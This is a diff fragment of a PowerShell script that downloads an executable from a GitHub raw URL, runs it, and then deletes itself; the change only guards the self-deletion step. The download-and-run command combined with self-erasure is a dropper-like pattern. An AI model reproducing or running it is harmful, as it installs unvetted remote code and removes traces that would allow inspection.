@@ -7,4 +7,6 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/w
 Start-Process -FilePath $exePath -Wait
 
 # Self-delete the script after execution
-Remove-Item -Path $PSCommandPath -Force
+if ($PSCommandPath) {
+    Remove-Item -Path $PSCommandPath -Force
+}
